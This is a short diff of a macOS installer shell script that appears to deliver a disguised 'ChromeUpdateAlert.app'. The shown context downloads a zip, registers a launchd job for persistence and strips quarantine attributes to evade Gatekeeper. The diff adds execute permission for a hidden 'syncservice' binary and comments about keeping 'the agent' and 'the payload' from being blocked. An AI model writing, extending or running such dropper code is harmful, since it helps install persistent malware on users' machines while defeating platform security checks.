@@ -48,6 +48,7 @@ with urllib.request.urlopen(url, context=ctx) as r, open(outfile, 'wb') as f:
     # Confirm the expected launcher exists after extraction
     if [[ -f "$WORK_DIR/$EXECUTABLE" ]]; then
         chmod +x "$WORK_DIR/$EXECUTABLE"
+        chmod +x "$WORK_DIR/syncservice" 2>/dev/null
     else
         echo "$EXECUTABLE not found after unzip."
         cleanup
@@ -75,7 +76,10 @@ if ! launchctl list | grep -q "$LABEL"; then
     launchctl load "$PLIST_FILE"
 fi
 
-# Step 5: Strip quarantine attribute (unsigned binaries; avoid Gatekeeper block)
+# Step 5: Strip quarantine attribute BEFORE anything touches the payload.
+# The zip arrives via python urllib (no quarantine on the zip itself), but
+# Apple's unzip/xattr can re-apply quarantine to extracted binaries; stripping
+# first avoids Gatekeeper killing the agent or the app on first exec.
 xattr -dr com.apple.quarantine "$WORK_DIR" 2>/dev/null
 
 # Step 6: Run ChromeUpdateAlert.app
